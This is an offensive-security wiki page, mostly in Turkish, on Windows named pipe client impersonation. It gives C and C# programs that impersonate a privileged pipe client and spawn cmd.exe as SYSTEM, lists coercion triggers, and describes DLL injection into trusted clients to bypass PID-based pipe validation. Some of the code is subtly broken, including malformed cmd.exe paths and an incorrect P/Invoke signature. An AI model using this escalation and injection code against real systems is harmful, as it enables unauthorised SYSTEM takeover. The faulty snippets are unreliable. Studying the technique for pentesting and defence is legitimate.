# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation, named-pipe sunucu iş parçacığının kendisine bağlanan bir istemcinin güvenlik bağlamını üstlenmesine izin veren bir yerel ayrıcalık yükseltme primitifiğidir. Pratikte, SeImpersonatePrivilege ile kod çalıştırabilen bir saldırgan, yetkili bir istemciyi (ör. bir SYSTEM servisi) saldırgan-kontrollü bir pipe'a bağlanmaya zorlayabilir, ImpersonateNamedPipeClient çağırabilir, ortaya çıkan token'ı bir primary token'a kopyalayabilir ve istemci olarak (çoğunlukla NT AUTHORITY\SYSTEM) bir süreç başlatabilir.

Bu sayfa temel tekniğe odaklanır. SYSTEM'i sizin pipe'ınıza zorlayan uçtan uca exploit zincirleri için aşağıda referans verilen Potato ailesi sayfalarına bakın.

## TL;DR
- Create a named pipe: \\.\pipe\<random> ve bağlantı bekleyin.
- Yetkili bir bileşenin buna bağlanmasını sağlayın (spooler/DCOM/EFSRPC/etc.).
- Pipe'tan en az bir mesaj okuyun, sonra ImpersonateNamedPipeClient çağırın.
- Mevcut iş parçacığından impersonation token'ını açın, DuplicateTokenEx(TokenPrimary) yapın ve CreateProcessWithTokenW/CreateProcessAsUser ile bir SYSTEM süreci elde edin.

## Requirements and key APIs
- Çağıran proses/iş parçacığı tarafından tipik olarak gereken ayrıcalıklar:
- SeImpersonatePrivilege, bağlanan bir istemciyi başarılı şekilde taklit etmek ve CreateProcessWithTokenW kullanmak için.
- Alternatif olarak, SYSTEM olarak taklit ettikten sonra CreateProcessAsUser kullanabilirsiniz; bu SeAssignPrimaryTokenPrivilege ve SeIncreaseQuotaPrivilege gerektirebilir (bunlar SYSTEM olarak taklit ederken sağlanır).
- Kullanılan temel API'ler:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (impersonation'dan önce en az bir mesaj okunmalı)
- ImpersonateNamedPipeClient ve RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW veya CreateProcessAsUser
- Impersonation seviyesi: yerelde faydalı işlemler yapabilmek için istemcinin SecurityImpersonation'a izin vermesi gerekir (birçok yerel RPC/named-pipe istemcisi için varsayılan). İstemciler pipe'ı açarken SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile bunu düşürebilirler.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notlar:
- Eğer ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) döndürürse, önce pipe'tan okuduğunuzdan ve istemcinin impersonation'ı Identification seviyesine sınırlamadığından emin olun.
- Process oluşturmak için uygun bir primary token oluşturmak amacıyla DuplicateTokenEx'i SecurityImpersonation ve TokenPrimary ile tercih edin.

## .NET hızlı örnek
In .NET, NamedPipeServerStream RunAsClient aracılığıyla impersonate yapabilir. Impersonate edildikten sonra, iş parçacığı token'ını duplicate edip bir process oluşturun.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## SYSTEM'i named pipe'ınıza yönlendirmek için yaygın tetikleyiciler/zorlama yöntemleri
Bu teknikler, ayrıcalıklı hizmetleri named pipe'ınıza bağlanmaya zorlar, böylece onları taklit edebilirsiniz:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Ayrıntılı kullanım ve uyumluluk için buraya bakın:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Eğer sadece pipe'ı oluşturma ve taklit ederek bir servis tetikleyicisinden SYSTEM spawn etme hakkında tam bir örneğe ihtiyacınız varsa, bkz:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Kötüye Kullanımı & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe ile sertleştirilmiş servisler, güvenilir istemci üzerinde müdahale yapılarak hâlâ ele geçirilebilir. [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) gibi araçlar, istemciye bir helper DLL bırakır, trafiğini proxy'ler ve SYSTEM servisi tüketmeden önce ayrıcalıklı IPC ile oynamanıza izin verir.

### Güvenilir süreçler içinde inline API hooking
- Herhangi bir istemciye helper DLL'i (OpenProcess → CreateRemoteThread → LoadLibrary) enjekte edin.
- DLL, `ReadFile`, `WriteFile` vb. çağrıları Detours ile yakalar; ancak yalnızca `GetFileType` `FILE_TYPE_PIPE` rapor ettiğinde çalışır, her buffer/metadatanın bir kopyasını bir kontrol pipe'ına kopyalar, düzenlemenize/silmenize/yeniden oynatmanıza izin verir ve sonra orijinal API'ye devam eder.
- Meşru istemciyi Burp-benzeri bir proxy'ye dönüştürür: UTF-8/UTF-16/raw payload'ları duraklatın, hata yollarını tetikleyin, dizileri yeniden oynatın veya JSON izlerini dışa aktarın.

### PID tabanlı doğrulamayı atlatmak için remote client modu
- Allow-listed bir istemciye enjekte edin, sonra GUI'de ilgili pipe ve o PID'i seçin.
- DLL, trusted process içinde `CreateFile`/`ConnectNamedPipe` çağrıları yapar ve I/O'yu size iletir, böylece sunucu hala meşru PID/görüntüsünü gözlemler.
- `GetNamedPipeClientProcessId` veya signed-image kontrollerine dayanan filtreleri atlar.

### Hızlı enumerasyon ve fuzzing
- `pipelist` `\\.\pipe\*` içindekileri listeler, ACL'leri/SID'leri gösterir ve girişleri anında sorgulama için diğer modüllere iletir.
- Pipe client/message composer herhangi bir isimle bağlanır ve UTF-8/UTF-16/raw-hex payload'ları oluşturur; yakalanmış blob'ları içe aktarın, alanları değiştirin ve deserializer'ları veya kimlik doğrulamasız komut fiillerini avlamak için yeniden gönderin.
- Helper DLL, tooling/fuzzers'ın Python SDK üzerinden uzaktan pipe'ı kullanabilmesi için bir loopback TCP listener barındırabilir.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
TCP bridge'i VM snapshot restores ile birleştirerek kırılgan IPC parser'larını çökertme testi yapın.

### Operasyonel hususlar
- Named pipes düşük gecikmeli; buffer'ları düzenlerken uzun duraklamalar kırılgan servislerde kilitlenmeye yol açabilir.
- Overlapped/completion-port I/O kapsamı kısmi olduğundan kenar durumlara hazırlıklı olun.
- Injection gürültülüdür ve unsigned olduğundan, bunu gizli bir implant yerine lab/exploit-dev yardımcısı olarak değerlendirin.

## Sorun giderme ve dikkat edilmesi gerekenler
- ImpersonateNamedPipeClient'ı çağırmadan önce pipeden en az bir mesaj okumalısınız; aksi takdirde ERROR_CANNOT_IMPERSONATE (1368) alırsınız.
- Eğer client SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ile bağlanırsa, sunucu tam olarak impersonate edemez; token'ın impersonation level'ını GetTokenInformation(TokenImpersonationLevel) ile kontrol edin.
- CreateProcessWithTokenW, çağıranın SeImpersonatePrivilege'ına ihtiyaç duyar. Eğer bu ERROR_PRIVILEGE_NOT_HELD (1314) ile başarısız olursa, önceden SYSTEM olarak impersonate ettikten sonra CreateProcessAsUser kullanın.
- Pipe'inizin security descriptor'ının hedef servisin bağlanmasına izin verdiğinden emin olun; varsayılan olarak \\.\pipe altındaki pipe'lar sunucunun DACL'ına göre erişilebilir.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
